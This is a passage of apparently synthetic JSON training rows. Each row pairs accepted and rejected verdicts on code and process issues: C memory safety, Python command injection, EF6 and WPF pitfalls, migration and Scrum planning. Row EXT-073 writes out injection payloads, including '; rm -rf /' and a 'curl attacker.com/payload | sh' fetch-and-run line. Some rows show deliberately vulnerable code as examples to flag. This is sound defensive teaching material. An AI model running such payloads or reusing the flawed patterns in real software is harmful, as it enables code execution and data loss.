# External Training Rows — Batch 4
## Row IDs: EXT-071 through EXT-090
## Date: 2026-05-04
## Focus: Families 4 and 6 (first rows); CWE 11–15; Groups 8–9 legacy .NET; Groups 13–15

---

## EXT-071

```json
{
  "rowId": "EXT-071",
  "sourceIds": ["CWE-TOP25"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "memory-safety",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this C result for null-dereference safety: a function receives a pointer from malloc(), uses the pointer to write a struct value, and then calls a second function passing that pointer — all without checking whether malloc returned NULL.",
    "b": "Config* cfg = malloc(sizeof(Config)); cfg->timeout = 30; cfg->retries = 3; apply_config(cfg); — no NULL check between malloc and the field assignments.",
    "c": "Context: CWE-476 (NULL Pointer Dereference) rank 7 in CWE Top 25 2023. malloc() returns NULL when allocation fails. Writing through a NULL pointer causes undefined behavior — typically a SIGSEGV crash. On some embedded systems with no MMU, a NULL write can overwrite address 0 with valid data, causing silent corruption."
  },
  "function": "Apply nullDereferenceArbiter: verify that every pointer returned from a fallible allocation function is checked for NULL before the pointer is dereferenced.",
  "acceptedOutput": {
    "decision": "REJECT. malloc() return value is not checked. Writing cfg->timeout = 30 through a NULL pointer is undefined behavior under the C standard. On POSIX systems this produces SIGSEGV; on systems without virtual memory protection it silently corrupts address 0. CWE-476 applies.",
    "reprocessInstruction": "Add null check immediately after malloc: Config* cfg = malloc(sizeof(Config)); if (cfg == NULL) { log_error(\"allocation failed\"); return ERROR_ALLOC; } cfg->timeout = 30; — the check must precede every dereference."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. Modern operating systems overcommit memory; malloc rarely returns NULL in practice on systems with sufficient virtual address space."
  },
  "arbiters": ["nullDereferenceArbiter"],
  "whyAccepted": "CWE-476 does not include an exception for overcommit environments. The arbiter must enforce the check regardless of expected runtime conditions — the code is incorrect regardless of how often the failure manifests.",
  "whyRejected": "Overcommit is an OS policy, not a language guarantee. The rejected output substitutes a deployment assumption for a correctness check. The arbiter evaluates source code correctness, not deployment probability.",
  "sourceAnchors": [
    {
      "sourceId": "CWE-TOP25",
      "url": "https://cwe.mitre.org/data/definitions/476.html",
      "section": "CWE-476 Extended Description and Observed Examples",
      "license": "MITRE CWE Terms of Use",
      "requiredNotice": "CWE™ is a trademark of The MITRE Corporation"
    }
  ],
  "licenseConstraint": "MITRE notice required",
  "trainingStatus": "candidate"
}
```

---

## EXT-072

```json
{
  "rowId": "EXT-072",
  "sourceIds": ["CWE-TOP25"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "memory-safety",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this C function for buffer safety: a function copies a user-supplied hostname string into a fixed 64-byte stack buffer using strcpy, then calls a network function with that buffer.",
    "b": "char hostname[64]; strcpy(hostname, user_input); connect_to_host(hostname); — user_input length is not bounded before the copy.",
    "c": "Context: CWE-119 Improper Restriction of Operations within the Bounds of a Memory Buffer (rank 8 in CWE Top 25 2023). strcpy does not check destination capacity. A user-supplied string longer than 63 bytes overflows the stack buffer, potentially overwriting the return address and enabling code execution."
  },
  "function": "Apply bufferBoundsArbiter: verify that every string copy into a fixed buffer uses a length-bounded copy function and validates the source length against the destination capacity.",
  "acceptedOutput": {
    "decision": "REJECT. strcpy(hostname, user_input) copies until the NUL terminator of user_input, ignoring the 64-byte capacity of hostname. Any user_input longer than 63 bytes (plus NUL) overflows the stack buffer. CWE-119 applies. The overflow overwrites adjacent stack frames; on platforms with executable stacks this enables arbitrary code execution.",
    "reprocessInstruction": "Replace strcpy with strncpy(hostname, user_input, sizeof(hostname) - 1); hostname[sizeof(hostname) - 1] = '\\0'; Or use strlcpy if available. Also add a length validation before the copy: if (strlen(user_input) >= sizeof(hostname)) { return ERROR_INPUT_TOO_LONG; }"
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The hostname buffer is stack-allocated and will be released at the end of the function scope. Stack memory is automatically reclaimed."
  },
  "arbiters": ["bufferBoundsArbiter"],
  "whyAccepted": "Stack lifetime is irrelevant to the overflow. The buffer is overflowed during the strcpy call, before the function returns. The return address corruption happens on the stack, which is the exploitation vector, not a mitigation.",
  "whyRejected": "The rejected output confuses memory lifetime (stack is freed on return) with memory safety (the overflow occurs before return). Stack allocation is not a buffer overflow defense.",
  "sourceAnchors": [
    {
      "sourceId": "CWE-TOP25",
      "url": "https://cwe.mitre.org/data/definitions/119.html",
      "section": "CWE-119 Extended Description — strcpy as classic example",
      "license": "MITRE CWE Terms of Use",
      "requiredNotice": "CWE™ is a trademark of The MITRE Corporation"
    }
  ],
  "licenseConstraint": "MITRE notice required",
  "trainingStatus": "candidate"
}
```

---

## EXT-073

```json
{
  "rowId": "EXT-073",
  "sourceIds": ["CWE-TOP25"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "injection",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this Python result: a web endpoint receives a filename parameter and passes it to subprocess.call() to run a server-side conversion tool, constructing the shell command by string concatenation.",
    "b": "filename = request.args.get('file'); subprocess.call('convert ' + filename + ' output.pdf', shell=True) — filename is not validated or sanitized before use in the shell command.",
    "c": "Context: CWE-78 Improper Neutralization of Special Elements used in an OS Command (OS Command Injection) — rank 5 in CWE Top 25 2023. shell=True causes the command string to be interpreted by /bin/sh. A filename containing '; rm -rf /' or '$(command)' executes the injected command with the web server's process privileges."
  },
  "function": "Apply osCommandInjectionArbiter: verify that user-controlled values are never interpolated into shell command strings, and that subprocess invocations use the list form (not shell=True) with explicit argument separation.",
  "acceptedOutput": {
    "decision": "REJECT. The filename parameter is interpolated directly into a shell command string with shell=True. An attacker can inject ; rm -rf / or $(curl attacker.com/payload | sh) as the filename. The shell interprets the entire string including injected operators. CWE-78 applies. Consequence: remote code execution with the web server's OS user privileges.",
    "reprocessInstruction": "Use the list form and disable shell interpretation: subprocess.call(['convert', filename, 'output.pdf']) with shell=False (the default). Validate filename against an allowlist of safe characters before passing to subprocess: if not re.match(r'^[\\w\\-\\.]+$', filename): abort(400). Both the list form AND the validation are required."
  },
  "rejectedOutput": {
    "decision": "ACCEPT if the application is deployed in a container. Container isolation limits the blast radius of any command injection to the container filesystem."
  },
  "arbiters": ["osCommandInjectionArbiter"],
  "whyAccepted": "Container isolation reduces the blast radius but does not prevent code execution. A compromised container can still exfiltrate data, pivot to other containers on the same network, or escalate via host kernel vulnerabilities. CWE-78 applies regardless of deployment environment.",
  "whyRejected": "Container isolation is a defense-in-depth layer, not a remediation for OS command injection. The vulnerability must be fixed in the code; isolation is a supplementary control.",
  "sourceAnchors": [
    {
      "sourceId": "CWE-TOP25",
      "url": "https://cwe.mitre.org/data/definitions/78.html",
      "section": "CWE-78 Extended Description — shell=True as classic injection vector",
      "license": "MITRE CWE Terms of Use",
      "requiredNotice": "CWE™ is a trademark of The MITRE Corporation"
    }
  ],
  "licenseConstraint": "MITRE notice required",
  "trainingStatus": "candidate"
}
```

---

## EXT-074

```json
{
  "rowId": "EXT-074",
  "sourceIds": ["SWE-BENCH"],
  "sourceTrustTier": 1,
  "datasetFamily": "domainResultsArray_to_resultI",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "result-aggregation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Given an array of domain results from processing a single user request — [authentication_result, data_result, notification_result] — select and combine them into one resultI that the arbiter stage can evaluate. The user requested: 'Create my account and send me a welcome email.'",
    "b": "Domain results: authentication_result = { status: 'SUCCESS', userId: 'usr_4829', sessionToken: 'tok_abc123', tokenExpiry: '2026-05-04T14:30:00Z' }; data_result = { status: 'SUCCESS', record: { id: 'usr_4829', email: 'user@example.com', createdAt: '2026-05-04T13:00:00Z' } }; notification_result = { status: 'QUEUED', jobId: 'job_email_991', estimatedDelivery: '2026-05-04T13:02:00Z' }.",
    "c": "Context: Node 4 aggregation (domainResultsArray_to_resultI). All three results must be present and status-checked before producing resultI. The combined resultI must carry all information required by Node 7 (arbiter selector) and Node 8 (arbiter units) without them re-reading individual domain results. NOTIFICATION_QUEUED is an acceptable terminal state — the welcome email delivery is asynchronous."
  },
  "function": "Aggregate the three domain results into one resultI. Verify all statuses, combine relevant fields, and produce a self-contained result record.",
  "acceptedOutput": {
    "resultI": {
      "requestId": "req_create_account",
      "overallStatus": "SUCCESS",
      "userId": "usr_4829",
      "sessionToken": "tok_abc123",
      "tokenExpiry": "2026-05-04T14:30:00Z",
      "userRecord": {
        "email": "user@example.com",
        "createdAt": "2026-05-04T13:00:00Z"
      },
      "welcomeEmailStatus": "QUEUED",
      "welcomeEmailJobId": "job_email_991",
      "arbitrationTargets": ["accountCreationArbiter", "sessionIssuanceArbiter"],
      "sourceResults": ["authentication_result", "data_result", "notification_result"]
    },
    "rationale": "All three domain results report SUCCESS or QUEUED (an acceptable async terminal state). The aggregated resultI carries the session token, user record, and email job ID — all information needed by the arbiter stage and formatter without re-querying domain processors. The arbitrationTargets field pre-identifies which arbiters should evaluate this result, enabling Node 7 to route without re-reading the source request."
  },
  "rejectedOutput": {
    "resultI": {
      "overallStatus": "SUCCESS",
      "message": "Account created successfully."
    }
  },
  "arbiters": ["resultAggregationArbiter"],
  "whyAccepted": "The accepted resultI is self-contained: it carries all fields the downstream nodes need — session token for the formatter, email job ID for the arbiter checking notification delivery, user record for consistency checks. Arbiters do not re-query domain results.",
  "whyRejected": "The rejected output discards all structured data and produces a prose summary. The arbiter stage cannot evaluate 'Account created successfully' against machine-checkable rules — it cannot verify the token expiry, the email job status, or the user record creation timestamp.",
  "sourceAnchors": [
    {
      "sourceId": "SWE-BENCH",
      "url": "https://github.com/swe-bench/SWE-bench",
      "section": "Dataset format — result aggregation from multi-step task execution",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-075

```json
{
  "rowId": "EXT-075",
  "sourceIds": ["SWE-BENCH"],
  "sourceTrustTier": 1,
  "datasetFamily": "domainResultsArray_to_resultI",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "result-aggregation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Aggregate these two domain results into one resultI for arbitration. The user request was: 'Apply the security patch to file auth/session.py and run the test suite to verify no regressions.' Results arrived from two parallel processors.",
    "b": "patch_result = { status: 'APPLIED', file: 'auth/session.py', linesAdded: 12, linesRemoved: 4, patchHash: 'sha256:3a9f...', patchedAt: '2026-05-04T13:05:00Z' }; test_result = { status: 'FAILED', testsRun: 47, testsPassed: 45, testsFailed: 2, failedTests: ['test_session_expiry_edge_case', 'test_concurrent_refresh'], testRunId: 'run_8812' }.",
    "c": "Context: domainResultsArray_to_resultI. The patch was applied, but two tests failed. The overall status must reflect the test failure — the combined resultI cannot be SUCCESS when a verification step failed. The arbitration stage needs both results to route correctly: the patch was clean but the result is not acceptable without test passage."
  },
  "function": "Aggregate the two domain results into one resultI. Determine the correct overallStatus given patch success but test failure. Preserve all information needed for the reprocessing arbiter.",
  "acceptedOutput": {
    "resultI": {
      "requestId": "req_patch_and_test",
      "overallStatus": "PARTIAL_FAILURE",
      "patchStatus": "APPLIED",
      "patchFile": "auth/session.py",
      "patchHash": "sha256:3a9f...",
      "testStatus": "FAILED",
      "testRunId": "run_8812",
      "testsRun": 47,
      "testsPassed": 45,
      "testsFailed": 2,
      "failedTests": ["test_session_expiry_edge_case", "test_concurrent_refresh"],
      "arbitrationTargets": ["patchCorrectnessArbiter", "testRegressionArbiter"],
      "reprocessCandidate": true,
      "reprocessScope": "The patch introduced regressions in session expiry and concurrent refresh. Reprocess the patch with those two test cases as acceptance criteria."
    },
    "rationale": "Patch success does not imply request success when the verification step fails. PARTIAL_FAILURE is the correct overall status. The resultI preserves the failed test names so the reprocessing arbiter can send the exact scope back to Node 1 without re-running all 47 tests."
  },
  "rejectedOutput": {
    "resultI": {
      "overallStatus": "SUCCESS",
      "note": "Patch was applied. 2 tests failed but may be pre-existing failures unrelated to the patch."
    }
  },
  "arbiters": ["resultAggregationArbiter"],
  "whyAccepted": "The verification step (test suite) is part of the request. A failed verification makes the request PARTIAL_FAILURE regardless of whether the patch application itself was clean. The aggregation must not promote a failed verification to SUCCESS.",
  "whyRejected": "The rejected output speculates that the failed tests may be pre-existing. That determination belongs to the arbiter stage, not the aggregation stage. The aggregation stage must report what happened; attribution belongs to arbitration.",
  "sourceAnchors": [
    {
      "sourceId": "SWE-BENCH",
      "url": "https://github.com/swe-bench/SWE-bench",
      "section": "Dataset format — patch application with test verification",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-076

```json
{
  "rowId": "EXT-076",
  "sourceIds": ["SWE-CARE"],
  "sourceTrustTier": 1,
  "datasetFamily": "resultI_to_finalMachineResults",
  "domain": "C_SEMANTIC_TRANSLATION",
  "subdomain": "result-translation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Translate this formal resultI into a natural-language result suitable for user presentation. The result passed all arbiters.",
    "b": "resultI = { overallStatus: 'SUCCESS', userId: 'usr_4829', sessionToken: 'tok_abc123', tokenExpiry: '2026-05-04T14:30:00Z', userRecord: { email: 'user@example.com', createdAt: '2026-05-04T13:00:00Z' }, welcomeEmailStatus: 'QUEUED', welcomeEmailJobId: 'job_email_991' }",
    "c": "Context: Node 6 (result translator) translates formal machine results to natural language. Internal system identifiers (userId, sessionToken, jobId, tokenExpiry timestamps) stay internal unless the user needs them. The user asked to create an account and receive a welcome email. What they need to know: the account was created and the email is on its way."
  },
  "function": "Translate the formal resultI to natural-language finalMachineResult. Include only information the user needs. Omit internal identifiers, timestamps, and status codes.",
  "acceptedOutput": {
    "finalMachineResult": {
      "summary": "Your account has been created and you are now signed in.",
      "detail": "A welcome email is on its way to user@example.com. If it does not arrive within a few minutes, check your spam folder.",
      "userFacingData": {
        "email": "user@example.com"
      },
      "internalDataOmitted": ["userId", "sessionToken", "tokenExpiry", "welcomeEmailJobId", "createdAt"]
    }
  },
  "rejectedOutput": {
    "finalMachineResult": "SUCCESS. User ID: usr_4829. Session token: tok_abc123. Token expires: 2026-05-04T14:30:00Z. Welcome email job: job_email_991 queued at 2026-05-04T13:00:00Z."
  },
  "arbiters": ["resultTranslationArbiter"],
  "whyAccepted": "The accepted translation surfaces only user-relevant information: account creation confirmation, current sign-in state, and email delivery expectation. Internal identifiers (session token, job ID, timestamp strings) are security-sensitive or meaningless to the user.",
  "whyRejected": "The rejected output exposes the session token in plain text — a security issue — and presents ISO timestamps, database IDs, and job IDs that the user cannot act on. Translation to natural language is the node's contract; the rejected output is a raw field dump.",
  "sourceAnchors": [
    {
      "sourceId": "SWE-CARE",
      "url": "https://huggingface.co/datasets/inclusionAI/SWE-CARE",
      "section": "Code review result translation — formal to natural language",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-077

```json
{
  "rowId": "EXT-077",
  "sourceIds": ["SWE-CARE"],
  "sourceTrustTier": 1,
  "datasetFamily": "resultI_to_finalMachineResults",
  "domain": "C_SEMANTIC_TRANSLATION",
  "subdomain": "result-translation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Translate this PARTIAL_FAILURE resultI for a developer audience. The formatter will shape it for a developer who needs to know what to fix.",
    "b": "resultI = { overallStatus: 'PARTIAL_FAILURE', patchStatus: 'APPLIED', patchFile: 'auth/session.py', patchHash: 'sha256:3a9f...', testStatus: 'FAILED', testRunId: 'run_8812', testsRun: 47, testsPassed: 45, testsFailed: 2, failedTests: ['test_session_expiry_edge_case', 'test_concurrent_refresh'], reprocessCandidate: true, reprocessScope: 'The patch introduced regressions in session expiry and concurrent refresh.' }",
    "c": "Context: Node 6 (result translator) for a developer audience. Developers need: what was applied, what broke, and what they should look at next. Internal IDs (patchHash, testRunId) are meaningful to developers and should be preserved. ISO timestamps can be omitted. The 'reprocessCandidate' flag means the formatter will offer a reprocess option."
  },
  "function": "Translate the PARTIAL_FAILURE resultI for a developer. Include technical identifiers meaningful to the developer. Make the failure actionable.",
  "acceptedOutput": {
    "finalMachineResult": {
      "summary": "Patch applied to auth/session.py, but 2 tests failed.",
      "detail": "The patch (sha256:3a9f...) was applied cleanly. However, 2 of 47 tests failed in test run run_8812:\n• test_session_expiry_edge_case\n• test_concurrent_refresh\nThese tests relate to the session management code modified by the patch. Review the patch's handling of session expiry and concurrent token refresh.",
      "actionable": "Run the two failing tests in isolation to identify the regression: pytest auth/test_session.py::test_session_expiry_edge_case auth/test_session.py::test_concurrent_refresh -v",
      "reprocessAvailable": true
    }
  },
  "rejectedOutput": {
    "finalMachineResult": "The operation partially succeeded. Some tests did not pass. Please review the test output."
  },
  "rejectedOutputReason": "For a developer audience, 'some tests did not pass' without naming the tests is not actionable. The developer needs the test names and a reproduction command to diagnose the regression.",
  "arbiters": ["resultTranslationArbiter"],
  "whyAccepted": "Developer-audience translation preserves technical identifiers (patch hash, test run ID, test names), uses the test names in a runnable pytest command, and makes the result immediately actionable. The translation matches the audience.",
  "whyRejected": "The rejected output is audience-agnostic prose — no test names, no commands, no specific identifiers. It is less useful than reading the raw resultI. Translation must add actionability, not subtract information.",
  "sourceAnchors": [
    {
      "sourceId": "SWE-CARE",
      "url": "https://huggingface.co/datasets/inclusionAI/SWE-CARE",
      "section": "Code review result presentation — developer vs. manager audience",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-078

```json
{
  "rowId": "EXT-078",
  "sourceIds": ["EF6-SOURCE"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "legacy-dotnet-modernization",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this Entity Framework 6 result for migration readiness: a repository method loads a list of orders using a LINQ query with lazy loading enabled. The method then iterates over the orders and accesses each order's navigation property (OrderLines) inside a foreach loop to compute the total line count.",
    "b": "public List<Order> GetRecentOrders(int customerId) { return db.Orders.Where(o => o.CustomerId == customerId && o.CreatedAt > cutoff).ToList(); } — caller then iterates: foreach (var order in orders) { int count = order.OrderLines.Count(); totalLines += count; }",
    "c": "Context: Entity Framework 6 lazy loading. When lazy loading is enabled (default), accessing order.OrderLines inside a foreach on a list already loaded from the database issues one additional SELECT per order. For 100 orders, this produces 101 SELECTs (1 for the order list + 100 for OrderLines). This N+1 pattern is the most common EF6 performance failure mode and is a hard blocker for EF Core migration without changes — EF Core requires explicit opt-in for lazy loading."
  },
  "function": "Apply ef6NplusOneArbiter: detect lazy-loaded navigation property access inside a loop over a previously materialized collection. Flag the pattern and provide the eager-loading fix.",
  "acceptedOutput": {
    "decision": "REJECT. N+1 query pattern detected. order.OrderLines is a lazy-loaded navigation property. For each of the N orders returned by GetRecentOrders, EF6 issues a separate SELECT to load OrderLines when .Count() is called inside the foreach. 100 orders → 101 database round trips. This pattern is invisible in development with small datasets and catastrophic in production with large ones.",
    "reprocessInstruction": "Add .Include(o => o.OrderLines) to the query to eager-load navigation properties in a single JOIN: return db.Orders.Include(o => o.OrderLines).Where(o => o.CustomerId == customerId && o.CreatedAt > cutoff).ToList(); Then order.OrderLines.Count() uses the already-loaded collection. Also: disable lazy loading globally before EF Core migration — EF Core requires explicit .UseLazyLoadingProxies() and the pattern will silently stop working on migration if left as-is."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. EF6 lazy loading is enabled by default and handles navigation property loading automatically. The code correctly defers loading until the data is needed, reducing initial query complexity."
  },
  "arbiters": ["ef6NplusOneArbiter"],
  "whyAccepted": "Deferred loading is correct conceptually but produces N+1 queries when the deferred load is inside a loop. The arbiter must detect the pattern — navigation property access inside foreach over a materialized list — not evaluate the philosophical merit of lazy loading.",
  "whyRejected": "The rejected output describes what lazy loading does without evaluating whether the access pattern creates an N+1 problem. 'Reducing initial query complexity' is true but irrelevant when the deferred loads produce 100 queries instead of 1.",
  "sourceAnchors": [
    {
      "sourceId": "EF6-SOURCE",
      "url": "https://github.com/dotnet/ef6",
      "section": "Lazy Loading documentation — navigation property access pattern and N+1",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-079

```json
{
  "rowId": "EXT-079",
  "sourceIds": ["WPF-SAMPLES"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "legacy-dotnet-modernization",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this WPF result: a background Task calls Task.Run to perform a long-running data fetch, then inside the continuation directly sets a property on a UI control — a TextBlock — without marshaling back to the UI thread.",
    "b": "Task.Run(() => { var data = FetchDataFromServer(); resultTextBlock.Text = data.Summary; }); — resultTextBlock.Text is set inside Task.Run's thread, which is a ThreadPool thread, not the UI (Dispatcher) thread.",
    "c": "Context: WPF threading model. WPF controls can only be accessed from the Dispatcher thread (the UI thread). Accessing or modifying UI control properties from a non-dispatcher thread throws InvalidOperationException: 'The calling thread cannot access this object because a different thread owns it.' This is a hard runtime crash, not a performance issue."
  },
  "function": "Apply wpfDispatcherArbiter: detect cross-thread UI control access. Verify that all UI control modifications are marshaled to the Dispatcher thread.",
  "acceptedOutput": {
    "decision": "REJECT. resultTextBlock.Text = data.Summary executes on the ThreadPool thread created by Task.Run. This violates WPF's single-thread UI model and throws InvalidOperationException at runtime. The fix requires marshaling the assignment back to the Dispatcher thread.",
    "reprocessInstruction": "Wrap the UI update in Application.Current.Dispatcher.Invoke: Task.Run(() => { var data = FetchDataFromServer(); Application.Current.Dispatcher.Invoke(() => { resultTextBlock.Text = data.Summary; }); }); Or restructure using async/await which automatically returns to the calling (UI) thread after await: var data = await Task.Run(() => FetchDataFromServer()); resultTextBlock.Text = data.Summary;"
  },
  "rejectedOutput": {
    "decision": "ACCEPT. Task.Run creates a background thread and completes asynchronously, which correctly prevents blocking the UI thread during the fetch."
  },
  "arbiters": ["wpfDispatcherArbiter"],
  "whyAccepted": "Non-blocking fetch is correct, but the UI update must happen on the Dispatcher thread regardless. Task.Run prevents UI freeze during the fetch but does not provide safe UI access after the fetch. Both concerns must be addressed.",
  "whyRejected": "The rejected output evaluates only the non-blocking fetch. It does not evaluate the cross-thread UI assignment. The arbiter must flag both — fetch on background thread is correct; UI update on background thread is the violation.",
  "sourceAnchors": [
    {
      "sourceId": "WPF-SAMPLES",
      "url": "https://github.com/microsoft/WPF-Samples",
      "section": "Threading model samples — Dispatcher.Invoke and cross-thread UI access",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-080

```json
{
  "rowId": "EXT-080",
  "sourceIds": ["ESHOP-MODERNIZING"],
  "sourceTrustTier": 1,
  "datasetFamily": "historyAndVersions_to_reprocessingDecision",
  "domain": "A_TOPOLOGY",
  "subdomain": "stateful-to-stateless-migration",
  "rowClass": "migration-decision",
  "input": {
    "a": "Reprocessing decision: a WebForms page uses ViewState to carry the user's current shopping cart across postbacks. The modernization plan proposes migrating this page directly to an ASP.NET Core Razor Page. The migration was attempted and the cart disappears on every postback because ViewState has no equivalent in ASP.NET Core.",
    "b": "History: Attempt 1 — direct Razor Page migration, ViewState removed, cart state lost on postback. Status: FAILED. ViewState dependency count in page: 6 fields. Page lifecycle: Load → Postback → Load ViewState → Process events → PreRender. The cart is populated in Load from ViewState and repopulated in the postback handler.",
    "c": "Context: ViewState is WebForms-specific and has no equivalent in ASP.NET Core. The migration cannot proceed without replacing ViewState with an explicit state mechanism. Options: (1) session state, (2) hidden form fields with explicit serialization, (3) client-side state (localStorage/sessionStorage), (4) server-side cart persistence (database). The choice depends on cart durability requirements."
  },
  "function": "Produce a reprocessing decision: should the migration be retried, and if so, what must change before the next attempt?",
  "acceptedOutput": {
    "reprocessingDecision": "REPROCESS with prerequisite changes before next migration attempt.",
    "prerequisiteChanges": [
      "Replace ViewState cart with explicit server-side cart persistence. Recommended: CartService backed by distributed cache (Redis) keyed to session ID. Duration: cart survives browser refresh, tab close, and reasonable idle time.",
      "Extract the 6 ViewState fields into a CartDto model. Verify each field's purpose and whether it belongs in the cart (item list, quantities) or in page UI state (selected tab, sort order). UI state fields can use hidden inputs in Razor Pages; cart fields must use the CartService.",
      "Write integration tests for the cart add/remove/persist cycle against the CartService before the next migration attempt.",
      "Only after CartService is verified: migrate the WebForms page to Razor Page."
    ],
    "reasoning": "The first migration attempt proved that ViewState cannot be removed without a replacement. The reprocessing scope is not the Razor Page migration itself — it is the prerequisite extraction of ViewState-carried state into explicit, ASP.NET Core-compatible storage."
  },
  "rejectedOutput": {
    "reprocessingDecision": "RETRY the migration. Enable session state in ASP.NET Core and store the cart in ISession using JSON serialization."
  },
  "arbiters": ["migrationReadinessArbiter"],
  "whyAccepted": "The accepted decision identifies the prerequisite (CartService with integration tests) that must be verified before the migration is retried. Retrying without the prerequisite will reproduce the same failure.",
  "whyRejected": "The rejected output proposes ISession as the replacement without verifying that: (1) the six ViewState fields are all cart data (some may be UI state), (2) session state is appropriate for cart durability (sessions expire), (3) the CartService is tested before the migration is re-attempted. It retries without learning from the failure.",
  "sourceAnchors": [
    {
      "sourceId": "ESHOP-MODERNIZING",
      "url": "https://github.com/dotnet-architecture/eShopModernizing",
      "section": "WebForms to ASP.NET Core migration — ViewState replacement",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-081

```json
{
  "rowId": "EXT-081",
  "sourceIds": ["ROBOT-FRAMEWORK"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineCommand_to_machineActionItems",
  "domain": "C_SEMANTIC_TRANSLATION",
  "subdomain": "bdd-to-test-suite",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Decompose this test command into Robot Framework keyword definitions: 'Verify that a user cannot submit the checkout form if their cart is empty, and that the error message tells them to add items first.'",
    "b": "Acceptance criterion: submitting checkout with empty cart shows error message 'Your cart is empty. Add items before checking out.' The submit button must remain disabled when cart item count is 0.",
    "c": "Context: Robot Framework keyword-driven testing. One test case covers one acceptance criterion. Keywords are named in plain language. The test must be executable — keywords map to concrete browser automation steps via SeleniumLibrary or Playwright."
  },
  "function": "Produce Robot Framework keyword definitions and one test case that verifies the acceptance criterion. Each keyword is one testable step.",
  "acceptedOutput": {
    "robotFramework": "*** Settings ***\nLibrary    Browser\n\n*** Keywords ***\nNavigate To Checkout\n    Go To    ${BASE_URL}/checkout\n\nCheckout Submit Button Should Be Disabled\n    Get Element State    id=checkout-submit-btn    enabled    ==    False\n\nError Message Should Be\n    [Arguments]    ${expected_message}\n    Get Text    id=checkout-error-message    ==    ${expected_message}\n\n*** Test Cases ***\nCheckout With Empty Cart Shows Error\n    Given Navigate To Checkout\n    When The Cart Is Empty\n    Then Checkout Submit Button Should Be Disabled\n    And Error Message Should Be    Your cart is empty. Add items before checking out."
  },
  "rejectedOutput": {
    "robotFramework": "*** Test Cases ***\nTest Empty Cart Checkout\n    Open Browser    ${BASE_URL}/checkout    chrome\n    Click Button    checkout-submit-btn\n    Page Should Contain    error"
  },
  "arbiters": ["robotFrameworkArbiter"],
  "whyAccepted": "The accepted test uses named keywords that describe behavior, not browser operations. 'Navigate To Checkout', 'Checkout Submit Button Should Be Disabled', and 'Error Message Should Be' are readable by a product manager. The keyword bodies contain the implementation detail. The test case reads like the acceptance criterion.",
  "whyRejected": "The rejected output uses raw browser operations in the test case (Open Browser, Click Button, Page Should Contain). It does not verify that the button is disabled before the click — it clicks an enabled submit button and checks for any 'error' text. The test is brittle, implementation-level, and does not verify the disabled-state requirement.",
  "sourceAnchors": [
    {
      "sourceId": "ROBOT-FRAMEWORK",
      "url": "https://github.com/robotframework/robotframework",
      "section": "User Guide — keyword-driven test structure and Given/When/Then",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-082

```json
{
  "rowId": "EXT-082",
  "sourceIds": ["SCRUM-GUIDE"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "H_GOVERNANCE",
  "subdomain": "sprint-planning-governance",
  "rowClass": "arbiter-construction",
  "input": {
    "a": "Arbitrate this Sprint Planning result: the Development Team selected 8 items from the Product Backlog for the upcoming Sprint. When asked to produce a Sprint Goal, the team responded: 'The Sprint Goal is to complete the selected items.' The Product Owner accepted this.",
    "b": "Sprint Backlog items: 3 bug fixes, 2 refactoring tasks, 2 new features in unrelated areas, 1 infrastructure upgrade. Sprint Goal stated: 'Complete the selected items.'",
    "c": "Context: Scrum Guide 2020 §Sprint Goal. The Sprint Goal is a single objective for the Sprint that creates coherence and focus. 'Complete the selected items' is not a Sprint Goal — it restates the Sprint Backlog. A valid Sprint Goal answers: what value will this Sprint deliver and why? It must be achievable with the selected Backlog items but is not the same as the list of items."
  },
  "function": "Apply sprintGoalArbiter (Scrum Guide 2020): verify that the Sprint Goal creates a cohesive focus for the Sprint and is not a restatement of the Sprint Backlog.",
  "acceptedOutput": {
    "decision": "REJECT. 'Complete the selected items' is a restatement of the Sprint Backlog, not a Sprint Goal. The Scrum Guide 2020 requires that the Sprint Goal creates coherence and focus. A Sprint with 3 bug fixes, 2 refactors, 2 unrelated features, and 1 infrastructure upgrade lacks a coherent objective — the selected items themselves signal a planning problem (too much variety without focus).",
